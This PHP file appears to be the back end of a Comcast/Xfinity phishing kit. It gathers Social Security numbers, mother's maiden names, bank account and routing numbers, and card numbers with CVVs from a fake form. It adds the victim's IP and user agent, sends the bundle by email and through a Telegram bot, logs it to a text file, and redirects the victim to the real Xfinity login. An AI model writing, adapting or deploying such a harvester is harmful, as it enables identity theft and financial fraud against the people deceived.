<?php

session_start();
include ('cid.php');
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
	
	$message .= "|------------| @2025 |--------------|\n";
	$message .= "    -----------o0o^v^o0o---------\n";
	$message .= "|------------| -Option 1 ACC- |--------------|\n";
	$message .= "|Social          : ".$_POST['ssNumber']."\n";
	$message .= "|Maiden Name        : ".$_POST['accountMN']."\n";
	$message .= "|Account Type          : ".$_POST['accountType']."\n";
	$message .= "|Account No        : ".$_POST['enteredAccountNumber']."\n";
	$message .= "|Routing No          : ".$_POST['enteredRoutingNumber']."\n";
	$message .= "|------------| -Option 2 CC- |--------------|\n";
	$message .= "|Card Number        : ".$_POST['accountCC']."\n";
	$message .= "|Expiring Date         : ".$_POST['accountExp']."\n";
	$message .= "|CVV        : ".$_POST['accountCvv']."\n";
	$message .= "    -----------o0o^v^o0o---------\n";
	$message .= "|--------- I N F O X I P ---------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://ip-api.com/json/.$ip ----\n";
	$message .= "User Agent : ".$hostname."\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- @2025 --------------|\n";
	$send = $to;
	$subject = "Comcast Details : $hostname";
    mail($send, $subject, $message);  
$tmz= [
                       'text' => 'Comcast Details :
\/============================\/
   /\/\/\/\@2024/\/\/\/\
[Comcast Fullz  : ] 
┌[🔐 Social : '.$_POST['ssNumber'].'
├[👤 MMN :'.$_POST['accountMN'].'
├[👤 Account Type :'.$_POST['accountType'].'
├[🔐 Account No :'.$_POST['enteredAccountNumber'].'
├[🔐 Routing No :'.$_POST['enteredRoutingNumber'].'
├[🔐 Card Number :'.$_POST['accountCC'].'
├[🔐 Expiring Date :'.$_POST['accountExp'].'
├[🔐 CVV :'.$_POST['accountCvv'].'
├[🌐 IP : '.$ip.'   
└[📡 User-agent : '.$useragent.'
┗━━━━━━━━━━━━━━━━━━
\/============================\/ 


                                       ',
                                       'chat_id' => $chat_id
                                ];

                            file_get_contents("https://api.telegram.org/bot$api/sendMessage?".http_build_query($tmz) );	

    $tds = fopen("cum2.txt","a");
 fputs($tds,$message);
 fclose($tds);
  header("Location: https://login.xfinity.com/");


?>